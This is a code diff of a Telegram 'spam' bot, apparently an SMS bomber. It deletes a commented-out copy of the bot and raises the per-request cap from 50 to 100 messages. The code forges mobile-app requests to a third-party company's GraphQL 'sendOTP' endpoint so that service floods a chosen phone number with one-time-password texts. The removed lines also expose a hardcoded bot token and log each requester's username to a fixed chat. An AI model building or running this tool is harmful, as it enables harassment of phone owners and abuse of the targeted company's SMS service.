@@ -1,90 +1,3 @@
-# import telebot
-# import requests
-# bot=telebot.TeleBot('6103551301:AAFWQCycnoSZ2JCIZmS2JtNGfhQP05bg2Jw')
-# def sendMessage(number):
-#   headers = {
-#       "User-Agent": "Dart/3.1 (dart:io)",
-#       "Accept": "application/json",
-#       "Lang": "en",
-#       "Accept-Encoding": "gzip",
-#       "Content-Length": "96",
-#       "Host": "app.tagaddod.com",
-#       "Content-Type": "application/json; charset=utf-8"
-#   }
-
-#   data = f'{{"operationName":"","variables":{{}},"query":"mutation{{\\nsendOTP(phone: \\"{number}\\")\\n}}"}}'
-
-#   response = requests.post('https://app.tagaddod.com/graphql', headers=headers, data=data).text
-#   if "You will receive SMS with your OTP" in response:
-#       return "done"
-#   else:
-#       return "error"
-# processing_message = False
-# @bot.message_handler(commands=['start'])
-# def welcome (message):
-#     bot.send_message(message.chat.id,
-#                      '''
-#       اهلا بيك فـ Usf Bot 
-
-#     ابعت الرقم الي عايز تبعتلو Spam بدون اي مسافات و عدد الرسايل علي الشكل ده👇
-
-#     010xxxxxxxx:عدد الرسايل 
-#     '''
-#     )
-
-# def isMsg(message):
-#     return True
-
-
-
-# @bot.message_handler(func=isMsg)
-# def reply(message):
-#  global processing_message
-#  try:
-#     Text="Done"
-#     if processing_message:
-#             Text="معلش السيرفير بتاعنا بيبعت رسايل لحد دلوقتي ممكن تجرب تاني بعد دقايق🤍"
-#             bot.reply_to(message, Text)
-#             return
-
-#         # Set the flag to indicate that the bot is now processing a message
-#     processing_message = True
-#     bot.reply_to(message,"Wait....")
-#     x=message.text
-#     if " "in x:
-#       x=x.replace(" ","")
-#     if x[0]=="+":
-#       x=x[2:] 
-#     number=x[0:11]
-#     count=int(x[12:])
-#     max_count=50
-#     if count>max_count:
-#       bot.reply_to(message,f"مينفعش تبعت اكتر من  {max_count} في المره الواحده ")
-#       return
-
-
-#     for i in range(count):
-#       sendMessage(number)
-      
-
-
-   
-
-
-#  except Exception as e :
-#     Text="Faild"
-#     print(e)
-# #  finally:
-# #         processing_message = False
-
-#  bot.reply_to(message,Text)
-#  processing_message = False
-#  bot.send_message(1098317745,message.text+"\n"+"From: "+"@"+message.from_user.username+"\n"+"Response: "+Text)
-
-# bot.polling()
-
-
-
 import telebot
 import requests
 
@@ -146,7 +59,7 @@ def reply(message):
           x=x[2:] 
         number=x[0:11]
         count=int(x[12:])
-        max_count=50
+        max_count=100
         if count>max_count:
           bot.reply_to(message,f"مينفعش تبعت اكتر من  {max_count} في المره الواحده ")
           return
